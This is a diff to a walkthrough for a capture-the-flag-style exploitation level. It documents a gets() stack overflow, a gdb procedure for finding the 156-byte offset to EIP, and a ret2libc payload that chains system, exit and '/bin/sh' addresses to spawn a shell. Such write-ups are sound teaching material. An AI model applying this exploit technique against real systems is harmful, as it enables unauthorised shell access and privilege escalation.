@@ -1,6 +1,14 @@
 Level 4 - Walkthrough
 ========================
 
+Protection summary:
+- Stack canary: not present
+- NX: disabled (stack is executable)
+- PIE: disabled (binary text addresses stable)
+
+Vulnerability type:
+- Stack-based buffer overflow via gets()
+
 1) Recon
 - Target binary: /home/users/level04/level04
 - Key behavior observed:
@@ -20,6 +28,17 @@ Useful commands:
 	- gets() allows overflow into saved EIP.
 	- Computed overwrite offset to EIP is 156 bytes.
 
+- How to get the offset:
+	- take a random string of for example 200 character that has a pattern (Aa0Aa1Aa2Aa3Aa4A....)
+	- gdb ./level04
+	- set follow-fork-mode child
+	- set detach-on-fork off
+	- handle SIGSEGV stop
+	- run
+	- prompt the string (interumpt after hang)
+	- info registers eip
+		eip            0x41326641       0x41326641
+	- 41326641 is A2fA in hex and Af2A was in the position 156 in the string 
 
 3) Exploitation steps (ret2libc)
 
@@ -39,7 +58,15 @@ Example values used:
 - /bin/sh = 0xf7f897ec
 
 Step B - Build and send payload:
-	(python -c 'import struct,sys; sys.stdout.write("A"*156 + struct.pack("<I",0xf7e6aed0) + struct.pack("<I",0xf7e5eb70) + struct.pack("<I",0xf7f897ec) + "\n")'; cat) | ./level04
+	( python2 - <<'PY'
+	import sys, struct
+	payload = "A"*156
+	payload += struct.pack("<I", 0xf7e6aed0)  # system
+	payload += struct.pack("<I", 0xf7e5eb70)  # exit
+	payload += struct.pack("<I", 0xf7f897ec)  # "/bin/sh"
+	sys.stdout.write(payload + "\n")
+	PY
+	cat ) | ./level04
 
 Payload layout:
 - "A" * 156            -> reach saved EIP
